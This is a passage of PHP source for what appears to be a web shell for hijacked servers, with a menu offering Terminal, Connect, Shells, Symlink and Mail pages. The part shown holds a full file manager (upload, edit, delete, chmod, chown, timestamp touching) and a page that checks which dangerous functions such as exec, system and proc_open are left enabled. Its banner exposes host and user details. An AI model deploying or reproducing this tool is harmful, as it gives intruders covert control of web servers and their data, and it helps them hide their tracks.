	$map="";
	$d=str_replace("\\",_,$x);
	if(empty($d))
	{
		$d=realpath(".");
	}
	elseif(realpath($d))
	{	
		$d=realpath($d);
	}
	$d=str_replace("\\",_,$d);
	if(substr($d,-1)!=_) 
	{	
		$d.=_;
	}
	$d=str_replace("\\\\","\\",$d);
	$pd=$e=explode(_,substr($d,0,-1));
	$i=0;
	foreach($pd as $b) 
	{
		$t="";
		$j=0;
		foreach($e as $r) 
		{
			$t.=$r._;
			if($j==$i) 
			{	
				break;
			}
			$j++;
		}
		$map.="<a href=\"?d=".urle($t)."\" >".htmlspecialchars($b)."</a>"._;
		$i++;
	}
	return rtrim($map,_);
}

function MapDrive($x) 
{
	if(!Unix()) 
	{
		$v=explode("\\",$x);
		$v=$v[0];
		$l="";
		foreach(range("A","Z") as $lt) 
		{
			$drive=is_dir($lt.":\\");
			if($drive) 
			{
				$l.="<a href=\"?d=".urle($lt.":\\")."\">[";
				if(strtolower($lt.':')!=strtolower($v)) 
				{
					$l.=$lt ;
				}
				else
				{
					$l.="<font color=\"white\"><b>".$lt."</b></font>";
				}
				$l.="]</a>";
			}
		}
		return $l;
	}
}

function MenuTools($x) 
{
	global $menu_tools;
	$ol="<div class='menu-tools'><ul>";
	$menu_tools=$x;
	
	foreach($menu_tools as $k => $v)
	{
		$active=$_REQUEST['z']==$k?"class='active'":"";
		$ol.="<li><a ".$active." href='?z=".$k."'>[".$v['title']."]</a></li>" ;
	}
	$ol.="</ul></div>";
	return $ol;
}

function GetSafeMode() 
{
	if(ini_get("safe_mode")=='on') 
	{
		$safemod="<font class='off'>ON</font>";
	}
	else
	{
		$safemod="<font class='on'>OFF</font>";
	}
	return $safemod;
}

function MainMenu() 
{
	$menu=[
		"ExpL"			=> "?d=".urle(getcwd()),
		"&#9733; Sec."	=> "?x=secure",
		"Info"          => "?x=info",
		"Database"      => "?x=db",
		"Terminal"      => "?x=terminal",
		"Connect"       => "?x=connect",
		".Htaccess"     => "?x=htaccess",
		"PHP"           => "?x=php",
		"Perl/CGI"      => "?x=perl",
		"Mail"          => "?x=mail",
		"Process"       => "?x=process",
		"Shells"        => "?x=shells",
		"Symlink"       => "?x=symlink",
		"&#9819; Tools" => "?z",
		"Account"       => "?x=account",
		"Update"        => "?x=update",
		"logout"        => "?x=logout"
	];
	$nu="";
	foreach($menu as $val => $key)
	{
		$idxkey=substr($key,1,1);
		$idxval=substr($key,3);
		$active=any($idxkey,$_REQUEST)&&$_REQUEST[$idxkey]==$idxval?"class='active'":"";
		if($val=="logout")
		{
			$nu.="<li><a ".$active." href='".$key."' onclick=\"return confirm('Bye !');\">".$val."</a></li>" ;
		}
		else
		{
			$nu.="<li><a ".$active." href='".$key."'>".$val."</a></li>" ;
		}
	}
	return $nu;
}

printf("<div id='header'>
		<div class='header-left'>
			<div id='info'>
				<font class='on'>[%s]</font><br>
				<font class='on'>[%s]</font><br>
				[<a href='//%s' target='_blank'>%s</a>]: <font class='on'>%s:%s</font> [%s]: <font class='on'>%s:%s</font><br>
				[USER]: <font class='on'>%s(%s)</font> [GROUP]: <font class='on'>%s(%s)</font><br>
				[HDD]: <font class='on'>%s</font> / <font class='on'>%s</font><br>
				[PHPMODE]: <font class='on'>%s</font><br>
				[SAFEMODE]: %s<br>
			</div>
		</div>
		<div class='header-right'>
			<a href='%s'><div id='logo'>
				<h1 id='title'>%s</h1>
				<div class='line'>
					<h2>%s</h2>
				</div>
			</div></a>
		</div>
		<div class='clr'></div>
		</div>
		<div id='container'>
		<div class='menu'>
			<ul>%s</ul>
		</div>
		<div class='menu-directory'>
			<div class='map-switch'>
				<input type='submit' name='map-switch' value='&#9822;' onclick='mapSwitch(\"map1\",\"map2\")'>
			</div>
			<div class='map1' id='map1' style='display:inline-block'>
				<span style='margin-right:5px'>%s</span>
				<span style='margin-right:5px'>%s</span>
			</div>
			<div class='map2' id='map2' style='display:none'>
				<form method='post' id='map2-form' onsubmit='document.getElementById(\"map2-form\").action=\"?g=\" + encodeURI(document.getElementById(\"map2-input\").value);'>
					<input type='text' value='%s' id='map2-input'/>
					<input type='submit' value='Go'>
				</form>
			</div>
		</div>
		<div class='content'>",
		php_uname(),server_software,
		server_name,server_name,gethostbyname(http_host),server_port,
		B64D($config['user']),remote_addr,remote_port,
		GetUser("usr"),GetUser("uid"),GetUser("grp"),GetUser("gid"),
		GetFileSize(@disk_free_space($dir)),GetFileSize(@disk_total_space($dir)),
		php_sapi_name(),GetSafeMode(),php_self,$config['title'],$config['version'],
		MainMenu(),MapDrive($mapdir),MapDirectory($mapdir),$mapdir
);

if(any("g",$_REQUEST))
{
	$g=$_REQUEST['g'];

	if (is_dir($g))
	{
		header('location:'.php_self.'?d='.urle($g));
	}
	elseif(is_file($g)||is_link($g))
	{
		header('location:'.php_self.'?a=v&r='.urle($g));
	}
	else
	{
		header('location:'.php_self);
	}
}

if(any("d",$_REQUEST)||request_uri==script_name)
{
	$_SESSION['curdir']=$dir;

	if(any("file",$_REQUEST)&&$_REQUEST['file']=="New File")
	{
		$file=trim($dir._.$_REQUEST['what']);
		$myfile=@fopen($file,"w");
		if(!$myfile)
		{
			printf("<b class='off'>Can't create New File!</b>");
		}
		else
		{
			fclose($myfile);
			header("location:".php_self."?a=e&r=".urle($file));
		}
	}
	if(any("directory",$_REQUEST)&&$_REQUEST['directory']=="New Dir")
	{	
		@chdir($dir);
		$dire=trim($_REQUEST['what']);
		if(!@mkdir($dire))
		{
			printf("<b class='off'>Can't create New Directory!</b>");
		}
		else
		{
			printf("<b class='on'>Directory '%s' Created on %s</b>",$dire,GetFileTime($dir._.$dire,'create'));
		}
	}
	if(any("upload",$_REQUEST)&&$_REQUEST['upload']=="Upload")
	{	
		$upload=$dir._.trim(basename($_FILES["what"]["name"]));
		if(move_uploaded_file($_FILES["what"]["tmp_name"],$upload)) 
		{
			printf("<b class='on'>File %s has been uploaded</b>",basename($_FILES["what"]["name"]));
		} 
		else 
		{
			printf("<b class='off'>Can't upload new file!</b>");
		}
	}
	if($handle=@opendir($dir))
	{
		$reads=array();
		$count_dirs=0;
		$count_files=0;

		while(false!==($file=readdir($handle)))
		{
			$filedir=$dir._.$file;
			$updir=substr($dir,0,strrpos($dir,_));
			if (strlen($updir)<=2) $updir=$updir._;
			$type=GetFileType($filedir);
			$size=GetFileSize(@filesize($filedir));
			$last=GetFileTime($filedir,"modify");
			$perm=GetFilePerm($filedir);
			$owner=GetOwnerGroup($filedir);
			if($file==".")
			{
				$reads[]="<tr sorttable_customkey='2'><td><center><input type='checkbox' name='nochk[]' value='".urle($dir)."'/></center></td><td><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAd5JREFUeNqMU79rFUEQ/vbuodFEEkzAImBpkUabFP4ldpaJhZXYm/RiZWsv/hkWFglBUyTIgyAIIfgIRjHv3r39MePM7N3LcbxAFvZ2b2bn22/mm3XMjF+HL3YW7q28YSIw8mBKoBihhhgCsoORot9d3/ywg3YowMXwNde/PzGnk2vn6PitrT+/PGeNaecg4+qNY3D43vy16A5wDDd4Aqg/ngmrjl/GoN0U5V1QquHQG3q+TPDVhVwyBffcmQGJmSVfyZk7R3SngI4JKfwDJ2+05zIg8gbiereTZRHhJ5KCMOwDFLjhoBTn2g0ghagfKeIYJDPFyibJVBtTREwq60SpYvh5++PpwatHsxSm9QRLSQpEVSd7/TYJUb49TX7gztpjjEffnoVw66+Ytovs14Yp7HaKmUXeX9rKUoMoLNW3srqI5fWn8JejrVkK0QcrkFLOgS39yoKUQe292WJ1guUHG8K2o8K00oO1BTvXoW4yasclUTgZYJY9aFNfAThX5CZRmczAV52oAPoupHhWRIUUAOoyUIlYVaAa/VbLbyiZUiyFbjQFNwiZQSGl4IDy9sO5Wrty0QLKhdZPxmgGcDo8ejn+c/6eiK9poz15Kw7Dr/vN/z6W7q++091/AQYA5mZ8GYJ9K0AAAAAASUVORK5CYII='/> <a title='Current Directory' href='?d=".urle($dir)."'>.</a></td><td><center>".$type."</center></td><td><center>".$size."</center></td><td><center>".$perm."</center></td><td><center>".$owner."</center></td><td><center>".$last."</center></td><td><a class='action' href='?a=x&r=".urle($dir)."' onclick=\"return confirm('Delete It ?');\" title='Delete Folder'>&#10008;</a> <a class='action' href='?a=c&r=".urle($dir)."' title='Modify Folder'>&#8499;</a></td></tr>";
			}
			elseif($file=="..")
			{
				$reads[]="<tr sorttable_customkey='1'><td><center><input type='checkbox' name='nochk[]' value='".urle($updir)."'/></center></td><td><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAmlJREFUeNpsU0toU0EUPfPysx/tTxuDH9SCWhUDooIbd7oRUUTMouqi2iIoCO6lceHWhegy4EJFinWjrlQUpVm0IIoFpVDEIthm0dpikpf3ZuZ6Z94nrXhhMjM3c8895977BBHB2PznK8WPtDgyWH5q77cPH8PpdXuhpQT4ifR9u5sfJb1bmw6VivahATDrxcRZ2njfoaMv+2j7mLDn93MPiNRMvGbL18L9IpF8h9/TN+EYkMffSiOXJ5+hkD+PdqcLpICWHOHc2CC+LEyA/K+cKQMnlQHJX8wqYG3MAJy88Wa4OLDvEqAEOpJd0LxHIMdHBziowSwVlF8D6QaicK01krw/JynwcKoEwZczewroTvZirlKJs5CqQ5CG8pb57FnJUA0LYCXMX5fibd+p8LWDDemcPZbzQyjvH+Ki1TlIciElA7ghwLKV4kRZstt2sANWRjYTAGzuP2hXZFpJ/GsxgGJ0ox1aoFWsDXyyxqCs26+ydmagFN/rRjymJ1898bzGzmQE0HCZpmk5A0RFIv8Pn0WYPsiu6t/Rsj6PauVTwffTSzGAGZhUG2F06hEc9ibS7OPMNp6ErYFlKavo7MkhmTqCxZ/jwzGA9Hx82H2BZSw1NTN9Gx8ycHkajU/7M+jInsDC7DiaEmo1bNl1AMr9ASFgqVu9MCTIzoGUimXVAnnaN0PdBBDCCYbEtMk6wkpQwIG0sn0PQIUF4GsTwLSIFKNqF6DVrQq+IWVrQDxAYQC/1SsYOI4pOxKZrfifiUSbDUisif7XlpGIPufXd/uvdvZm760M0no1FZcnrzUdjw7au3vu/BVgAFLXeuTxhTXVAAAAAElFTkSuQmCC'/> <a title='Parent Directory' href='?d=".urle($updir)."'>".$file."</a></td><td><center>".$type."</center></td><td><center>".$size."</center></td><td><center>".$perm."</center></td><td><center>".$owner."</center></td><td><center>".$last."</center></td><td><a class='action' href='?a=x&r=".urle($updir)."' onclick=\"return confirm('Delete It ?');\" title='Delete Folder'>&#10008;</a> <a class='action' href='?a=c&r=".urle($updir)."' title='Modify Folder'>&#8499;</a></td></tr>";
			}
			else
			{
				if($type=="dir")
				{
					$reads[]="<tr sorttable_customkey='3'><td><center><input type='checkbox' name='chk[]' value='".urle($filedir)."' /></center></td><td><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAd5JREFUeNqMU79rFUEQ/vbuodFEEkzAImBpkUabFP4ldpaJhZXYm/RiZWsv/hkWFglBUyTIgyAIIfgIRjHv3r39MePM7N3LcbxAFvZ2b2bn22/mm3XMjF+HL3YW7q28YSIw8mBKoBihhhgCsoORot9d3/ywg3YowMXwNde/PzGnk2vn6PitrT+/PGeNaecg4+qNY3D43vy16A5wDDd4Aqg/ngmrjl/GoN0U5V1QquHQG3q+TPDVhVwyBffcmQGJmSVfyZk7R3SngI4JKfwDJ2+05zIg8gbiereTZRHhJ5KCMOwDFLjhoBTn2g0ghagfKeIYJDPFyibJVBtTREwq60SpYvh5++PpwatHsxSm9QRLSQpEVSd7/TYJUb49TX7gztpjjEffnoVw66+Ytovs14Yp7HaKmUXeX9rKUoMoLNW3srqI5fWn8JejrVkK0QcrkFLOgS39yoKUQe292WJ1guUHG8K2o8K00oO1BTvXoW4yasclUTgZYJY9aFNfAThX5CZRmczAV52oAPoupHhWRIUUAOoyUIlYVaAa/VbLbyiZUiyFbjQFNwiZQSGl4IDy9sO5Wrty0QLKhdZPxmgGcDo8ejn+c/6eiK9poz15Kw7Dr/vN/z6W7q++091/AQYA5mZ8GYJ9K0AAAAAASUVORK5CYII='/> <a title='Open Directory' href='?d=".urle($filedir)."'>".$file."</a></td><td><center>".$type."</center></td><td><center>".$size."</center></td><td><center>".$perm."</center></td><td><center>".$owner."</center></td><td><center>".$last."</center></td><td><a class='action' href='?a=x&r=".urle($filedir)."' onclick=\"return confirm('Delete It ?');\" title='Delete Folder'>&#10008;</a> <a class='action' href='?a=c&r=".urle($filedir)."' title='Modify Folder'>&#8499;</a></td></tr>";
					$count_dirs++;
				}
				else
				{
					$reads[]="<tr sorttable_customkey='4'><td><center><input type='checkbox' name='chk[]' value='".urle($filedir)."' /></center></td><td><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAAABnRSTlMAAAAAAABupgeRAAABHUlEQVR42o2RMW7DIBiF3498iHRJD5JKHurL+CRVBp+i2T16tTynF2gO0KSb5ZrBBl4HHDBuK/WXACH4eO9/CAAAbdvijzLGNE1TVZXfZuHg6XCAQESAZXbOKaXO57eiKG6ft9PrKQIkCQqFoIiQFBGlFIB5nvM8t9aOX2Nd18oDzjnPgCDpn/BH4zh2XZdlWVmWiUK4IgCBoFMUz9eP6zRN75cLgEQhcmTQIbl72O0f9865qLAAsURAAgKBJKEtgLXWvyjLuFsThCSstb8rBCaAQhDYWgIZ7myM+TUBjDHrHlZcbMYYk34cN0YSLcgS+wL0fe9TXDMbY33fR2AYBvyQ8L0Gk8MwREBrTfKe4TpTzwhArXWi8HI84h/1DfwI5mhxJamFAAAAAElFTkSuQmCC'> <a title='View File' href='?a=v&r=".urle($filedir)."'>".$file."</a></td><td><center>".$type."</center></td><td><center>".$size."</center></td><td><center>".$perm."</center></td><td><center>".$owner."</center></td><td><center>".$last."</center></td><td><a class='action' href='?a=e&r=".urle($filedir)."' title='Modify File'>&#8499;</a> <a class='action' href='?a=x&r=".urle($filedir)."' onclick=\"return confirm('Delete It ?');\" title='Delete File'>&#10008;</a> <a class='action' href='?a=d&r=".urle($filedir)."' title='Download File'>&#10149;</a></td></tr>";		
					$count_files++;
				}
			}
		}
		sort($reads);
		$filesdirs="";
		foreach($reads as $read)
		{
			$filesdirs.=$read;
		}
		printf("<div id='action'>
					<table><tr>
					<td><form class='new' method=POST action='?d=%s'>
						<input name='what' type='text' /><input type='submit' name='file' value='New File'/>
					</form></td>
					<td><form class='new' method=POST action='?d=%s'>
						<input name='what' type='text' /><input type='submit' name='directory' value='New Dir'/>
					</form></td>
					<td><form class='new' method=POST action='?x=find'>
						<input type='text' name='find-value'/><input type='submit' name='find-button' value='Find'/>
					</form></td>
					<td><form class='new' method=POST action='?d=%s&x=upload' enctype='multipart/form-data'>
						<input name='what' type='file' class='inputfile'/><input type='submit' name='upload' value='Upload'/>
					</form></td>
					</tr></table>
				</div>
				<div id='home'>
					<form name='files' method=POST action='?x=action' onclick='checkCount(\"count\")'>
						<table class='table sortable'>
							<thead>
								<tr>
									<th class='sorttable_nosort'><input type='checkbox' name='check-all' onclick='checkAll()'/></th>
									<th class='sorttable_numeric'>Name</th>
									<th>Type</th>
									<th>Size</th>
									<th>Perms</th>
									<th>Owner:Group</th>
									<th>Modified</th>
									<th>Act.</th>
								</tr>
							</thead>
							<tbody>%s</tbody>
							<tFoot>
								<tr>
									<td colspan='8'>[<span id='count'>0</span>] Selected | Dir's: [%s] File's: [%s]</td>
								</tr>
							</tFoot>
						</table>
						<select name='action-value'>
							<option value='copy'>Copy</option>
							<option value='move'>Move</option>
							<option value='delete'>Delete</option>
							<option value='zip'>Archive (zip)</option>
							<option value='unzip'>Extract to (zip)</option>
						</select>
						<input type='submit' value='Action' name='action-button' />
					</form>
				</div>",
				urle($dir),
				urle($dir),
				urle($dir),
				$filesdirs,
				$count_dirs,
				$count_files
		);
		closedir($handle);
	}
	else
	{
		printf("<b class='off'>
					Can't Open Location
				</b>");
	}
}

if(any("r",$_REQUEST))
{
	$file=file_exists(urld($_REQUEST["r"]))?strval(urld($_REQUEST["r"])):exit('File Not Found');
	$dir=any("curdir",$_SESSION)?$_SESSION['curdir']:getcwd();
	$status=any("status",$_SESSION)?$_SESSION['status']:"";
	$back=php_self."?d=".urle($dir);

	printf("<div class='divide'>
					<div class='divide-left'>
						<table class='table'>
							<tr><td>Name</td><td>%s</td></tr>
							<tr><td>Size</td><td>%s</td></tr>
							<tr><td>Permission</td><td>%s</td></tr>
							<tr><td>Create time</td><td>%s</td></tr>
							<tr><td>Last modified</td><td>%s</td></tr>
							<tr><td>Last accessed</td><td>%s</td></tr>
						</table>
					</div>
					<div class='divide-right'>
						<table class='table'>
							<tr><td>MIME</td><td>%s</td></tr>
							<tr><td>Owner/Group</td><td>%s</td></tr>
							<tr><td>MD5</td><td>%s</td></tr>
							<tr><td>SHA1</td><td>%s</td></tr>
						</table>
					</div>
				</div>",
				basename($file),
				GetFileSize(@filesize($file)),
				GetFilePerm($file),
				GetFileTime($file,"create"),
				GetFileTime($file,"modify"),
				GetFileTime($file,"access"),
				mime_content_type($file),
				GetFileOwnerGroup($file),
				@md5_file($file),
				@sha1_file($file)
	);

	if(is_file($file)||is_link($file))
	{
		printf("<div class='menu'>
					<ul>
						<li><a href='%s'>Back</a></li>
						<li><a href='?a=e&r=%s'>Edit</a></li>
						<li><a href='?a=v&r=%s'>View</a></li>
						<li><a href='?a=cp&r=%s'>Copy</a></li>
						<li><a href='?a=mv&r=%s'>Move</a></li>
						<li><a href='?a=d&r=%s'>Download</a></li>
						<li><a href='?a=h&r=%s'>Hexdump</a></li>
						<li><a href='?a=c&r=%s'>Chmod</a></li>
						<li><a href='?a=cwn&r=%s'>Chown</a></li>
						<li><a href='?a=cgp&r=%s'>Chgrp</a></li>
						<li><a href='?a=t&r=%s'>Touch</a></li>
						<li><a href='?a=r&r=%s'>Rename</a></li>
						<li><a href='?a=x&r=%s' onclick=\"return confirm('Delete It ?');\">Delete</a></li>
					</ul>
				</div>",
				$back,urle($file),
				urle($file),urle($file),urle($file),
				urle($file),urle($file),urle($file),
				urle($file),urle($file),urle($file),
				urle($file),urle($file),urle($file)
		);
	}
	elseif(is_dir($file))
	{
		printf("<div class='menu'>
					<ul>
						<li><a href='%s'>Back</a></li>
						<li><a href='?a=c&r=%s'>Chmod</a></li>
						<li><a href='?a=r&r=%s'>Rename</a></li>
						<li><a href='?a=t&r=%s'>Touch</a></li>
						<li><a href='?a=x&r=%s' onclick=\"return confirm('Delete It ?');\">Delete</a></li>
					</ul>
				</div>",
				$back,
				urle($file),urle($file),
				urle($file),urle($file)
		);
	}

	if($_REQUEST['a']=='e')
	{
		$source="";

		if(filesize($file) > 5242880)
		{
			$source.="Lazy to Read more than 5MB Files";
		}
		else
		{
			$open=fopen($file,'r');

			if($open) 
			{
				while(!feof($open)) 
				{
					$source.=htmlentities(fread($open,(1024*4)));
				}
				fclose($open);
			}
		}

		printf("<form class='frmsource' method='post'>
				<textarea id='sourcefocus' name='sourcecode' rows='25' cols='100'>%s</textarea>
				<input type='Submit' value='Save file' name='save'/>
				<label>%s</label>
			</form>",$source,$status);
	
		if(any("status",$_SESSION)) unset($_SESSION['status']);

		if(any("save",$_REQUEST))
		{
			$new_source=$_REQUEST['sourcecode'];
			if(function_exists("chmod")) chmod($file,0755);
			$source_edit=fopen($file,'wb+');
			$tulis=fputs($source_edit,$new_source);
			fclose($source_edit);
			if($tulis)
			{
				$_SESSION['status']="File Saved ! ".GetFileTime($file,"modify")." | ".GetFileSize(filesize($file));
			}
			else
			{
				$_SESSION['status']="Whoops, something went wrong...";
			}
			header("location:".php_self."?a=e&r=".urle($file));
		}
	}

	if($_REQUEST['a']=='r')
	{
		printf("<form class='new' method='post'>
			<input type='text' name='name' value='%s'/>
			<input type='Submit' value='Rename' name='rename'/>
			<label>%s</label>
		</form>",basename($file),$status);

		if(any("status",$_SESSION)) unset($_SESSION['status']);

		if(any("rename",$_REQUEST))
		{
			$path=pathinfo(trim($file));
			$newname=$path['dirname']._.trim($_REQUEST['name']);
			if(!rename(trim($file),$newname)) 
			{
			    $_SESSION['status']='Whoops, something went wrong...';
			} 
			else 
			{
			    $_SESSION['status']='Renamed file with success';
			}
			header("location:".php_self."?a=r&r=".urle($newname));
		}
	}

	if($_REQUEST['a']=='c')
	{
		printf("<form class='new' method='post'>
			<input type='text' name='octal' value='%s'/>
			<input type='Submit' value='Chmod' name='chmod'/>
			<label>%s</label>
		</form>",substr(decoct(fileperms($file)),2),$status);

		if(any("status",$_SESSION)) unset($_SESSION['status']);

		if(any("chmod",$_REQUEST))
		{
			$octal=octdec($_REQUEST['octal']);
			if(!chmod(trim($file),$octal)) 
			{
			    $_SESSION['status']='Whoops, something went wrong...';
			} 
			else 
			{
			    $_SESSION['status']='Chmod file with success';
			}
			header("location:".php_self."?a=c&r=".urle($file));
		}
	}

	if($_REQUEST['a']=='cwn')
	{
		$own='?';
		if(function_exists('posix_getpwuid')) 
		{
			$user=posix_getpwuid(fileowner($x));
			$own=$user['name'];
		}

		printf("<form class='new' method='post'>
			<input type='text' name='own' value='%s'/>
			<input type='Submit' value='Chown' name='chown'/>
			<label>%s</label>
		</form>",$own,$status);

		if(any("status",$_SESSION)) unset($_SESSION['status']);

		if(any("chown",$_REQUEST))
		{
			$own=$_REQUEST['own'];
			if(!chown(trim($file),$own)) 
			{
			    $_SESSION['status']='Whoops, something went wrong...';
			} 
			else 
			{
			    $_SESSION['status']='Chown file with success';
			}
			header("location:".php_self."?a=cwn&r=".urle($file));
		}
	}

	if($_REQUEST['a']=='cgp')
	{
		$grp='?';
		if(function_exists('posix_getgrgid')) 
		{
			$group=posix_getgrgid(filegroup($x));
			$grp=$group['name'];
		}

		printf("<form class='new' method='post'>
			<input type='text' name='grp' value='%s'/>
			<input type='Submit' value='Chgrp' name='chgrp'/>
			<label>%s</label>
		</form>",$grp,$status);

		if(any("status",$_SESSION)) unset($_SESSION['status']);

		if(any("chgrp",$_REQUEST))
		{
			$grp=$_REQUEST['grp'];
			if(!chgrp(trim($file),$grp)) 
			{
				$_SESSION['status']='Whoops, something went wrong...';
			} 
			else 
			{
				$_SESSION['status']='Chgrp file with success';
			}
			header("location:".php_self."?a=cgp&r=".urle($file));
		}
	}

	if($_REQUEST['a']=='t')
	{
		printf("<form class='new' method='post'>
			<input type='text' name='time' value='%s'/>
			<input type='Submit' value='Touch' name='touch'/>
			<label>%s</label>
		</form>",GetFileTime($file,"modify"),$status);

		if(any("status",$_SESSION)) unset($_SESSION['status']);

		if(any("touch",$_REQUEST))
		{
			$time=$_REQUEST['time'];
			if(!touch(trim($file),strtotime($time))) 
			{
			    $_SESSION['status']='Whoops, something went wrong...';
			} 
			else 
			{
			    $_SESSION['status']='Touched file with success';
			}
			header("location:".php_self."?a=t&r=".urle($file));
		}
	}

	if($_REQUEST['a']=='v')
	{
		printf("<div class='menu'>
					<ul>
						<li><a href='?a=v&r=%s'>Source</a></li>
						<li><a href='?a=v&w=f&r=%s'>iFrame</a></li>
						<li><a href='?a=v&w=i&r=%s'>Image</a></li>
						<li><a href='?a=v&w=v&r=%s'>Video</a></li>
						<li><a href='?a=v&w=a&r=%s'>Audio</a></li>
					</ul>
				</div>",
				urle($file),urle($file),
				urle($file),urle($file),
				urle($file));

		if(is_readable($file))
		{
			if(any("w",$_REQUEST))
			{
				$url=GetUrlFromPath($file);
				$type=end(explode(".",$file));

				if($_REQUEST['w']=='f')
				{
					printf("<center><iframe src='%s' width='100%%' height='325' frameBorder='0'>Suck</iframe><a href='%s' target='_blank'>--> New Tab <--</a></center>",$url,$url);
				}

				if($_REQUEST['w']=='i')
				{
					printf("<center><img src='%s' alt='&nbsp;Not Image'/></center>",$url);
				}

				if($_REQUEST['w']=='v')
				{
					printf("<center><video width='640' height='320' controls><source src='%s' type='video/%s'>Suck</video></center>",$url,$type);
				}

				if($_REQUEST['w']=='a')
				{
					printf("<center><audio controls><source src='%s' type='audio/%s'>Suck</audio></center>",$url,$type);
				}
			}
			else
			{
				if(filesize($file) > 5242880)
				{
					printf("Lazy to Read more than 5MB Files");
				}
				else
				{
					$code=highlight_file($file,true);
					printf("<div class='highlight'>%s</div>",$code);
				}
			}
		}
	}
	
	if($_REQUEST['a']=='h')
	{
		$c=file_get_contents($file);
		$n=0;
		$h=['00000000<br>','',''];
		$len=strlen($c);
		for($i=0;$i<$len;++$i)
		{
			$h[1].=sprintf('%02X',ord($c[$i])).' ';
			switch(ord($c[$i]))
			{
				case 0: $h[2].=' ';break;
				case 9: $h[2].=' ';break;
				case 10:$h[2].=' ';break;
				case 13:$h[2].=' ';break;
				default:$h[2].=$c[$i];break;
			}
			$n++;
			if($n==32)
			{
				$n=0;
				if($i+1 < $len)
				{
					$h[0].=sprintf('%08X',$i+1).'<br>';
				}
				$h[1].='<br>';
				$h[2].="\n";
			}
		}
		printf("
			<div id='hexdump'>
				<table class='hexdump'>
					<tr>
						<td><pre>%s</pre></td>
						<td><pre>%s</pre></td>
						<td><pre>%s</pre></td>
					</tr>
				</table>
			</div>",$h[0],$h[1],htmlspecialchars($h[2]));
	}

	if($_REQUEST['a']=='cp'||$_REQUEST['a']=='mv')
	{
		printf("<form class='new' method='post'>
			<input type='text' name='file-dest' value='%s'/>
			<input type='Submit' value='%s' name='submit'/>
			<label>%s</label>
		</form>",$file,($_REQUEST['a']=='cp'?'Copy':'Move'),$status);

		if(any("status",$_SESSION)) unset($_SESSION['status']);

		if(any("submit",$_REQUEST))
		{
			$source=$file;
			$dest=$_REQUEST['file-dest'];

			if(!file_exists($dest))
			{
				if ($_REQUEST['a']=='cp')
				{
					if(!copy(trim($source),trim($dest))) 
					{
					    $_SESSION['status']='Whoops, cannot copying...';
					} 
					else 
					{
					    $_SESSION['status']="Copy file with success <a href=?a=v&r='" . urle($dest) . "'>'" . basename($dest) . "'</a>";
					}
				}
				elseif($_REQUEST['a']=='mv')
				{
					if(!copy(trim($source),trim($dest))) 
					{
					    $_SESSION['status']='Whoops, cannot moving...';
					} 
					else 
					{
					    if(Remove($source))
					    {
					    	$_SESSION['status']="Move file with success";
					    	$file=$dest;
					   }
					    else
					    {
					    	$_SESSION['status']='Whoops, just copying...';
					   }
					}
				}
			}
			else
			{
				$_SESSION['status']="Whoops, File was Exists <a href=?a=v&r='" . urle($dest) . "'>'" . basename($dest) . "'</a>";
			}

			if($_REQUEST['a']=='cp')
			{
				header("location:".php_self."?a=cp&r=".urle($file));
			}
			elseif($_REQUEST['a']=='mv')
			{
				header("location:".php_self."?a=mv&r=".urle($file));
			}
		}
	}

	if($_REQUEST['a']=='d')
	{
		if(file_exists($file))
		{
			header('Cache-Control:must-revalidate,post-check=0,pre-check=0');
			header('Content-Disposition:attachment;filename='.basename($file));
			header('Content-Type:application/octet-stream');
			header('Content-Description:File Transfer');
			header('Content-Transfer-Encoding:binary');
			header('Content-Length:'.filesize($file));
			header('Pragma:public');
			header('Expires:0');
			ob_clean();
			readfile($file);
			exit;
		}
	}
	
	if($_REQUEST['a']=='x')
	{
		if(file_exists($file))
		{
			if(Remove($file))
			{
				header("location:".$back);
			}
		}	
	}
}

if(any("x",$_REQUEST))
{
	if($_REQUEST['x']=="logout")
	{
		session_destroy();
		session_regenerate_id();
		header('location:'.php_self);
	}
	if($_REQUEST['x']=="secure")
	{
		$disable_functions=array_filter(array_map('trim',explode(',',ini_get("disable_functions"))));
		$security=['show_source','mysql_list_dbs','openlog','syslog','apache_child_terminate','apache_setenv',
					'apache_getenv','apache_note','exec','system','passthru','shell_exec','escapeshellarg',
					'escapeshellcmd','virtual','mb_send_mail','proc_close','proc_open','ini_alter','dl',
					'popen','pcntl_exec','socket_accept','socket_bind','socket_clear_error','socket_close',
					'socket_connect','socket_create_listen','socket_create_pair','socket_create',
					'socket_get_option','socket_getpeername','socket_getsockname','socket_last_error',
					'socket_listen','socket_read','socket_recv','socket_recvfrom','socket_select',
					'socket_send','socket_sendto','socket_set_block','socket_set_nonblock',
					'socket_set_option','socket_shutdown','socket_strerror','socket_write',
					'stream_socket_server','pfsockopen','disk_total_space','disk_free_space',
					'diskfreespace','chown','getrusage','get_current_user','set_time_limit',
					'leak','listen','chgrp','link','symlink','dlopen','proc_nice','proc_get_stats',
					'proc_terminate','sh2_exec','posix_getpwuid','posix_getgrgid','posix_kill',
					'ini_restore','mkfifo','dbmopen','dbase_open','filepro','filepro_rowcount',
					'posix_mkfifo','_xyec','mainwork','get_num_redirects','putenv','geoip_open','sleep'];

		$fucks=array_unique(array_merge($disable_functions,$security));
		$table="";
		$no=1;
		$enable=0;
		$disable=0;
		$total=count($fucks);
		foreach($fucks as $fuck) 
		{
			$table.="<tr><td>$no</td><td>$fuck</td><td>";
			if(in_array($fuck,$disable_functions))
			{
				$disable++;
				$table.="<font color=red>DIE</font>";
			}
			else
			{
				$enable++;
				$table.="<center><font color=white>READY</font></center>";
			}
			$table.="</td></tr>";
			$no++;
		}

		$risk=($enable / $total) * 100;
		$secure=($disable / $total) * 100;

		printf("<h2 style='text-align:center'>Sec. Info V1.0.%s</h2><br>
			<h4 style='text-align:center;color:white'>Risks Rate <font color=red>[%s%%]</font> | Secure Rate <font color=lime>[%s%%]</font></h4><br><br>
			<table class='table'>
				<thead>
					<tr>
						<th width='15'>No.</th>
						<th>Disable Function</th>
						<th>Status</th>
					</tr>
				</thead>
				<tbody>
					%s
				</tbody>
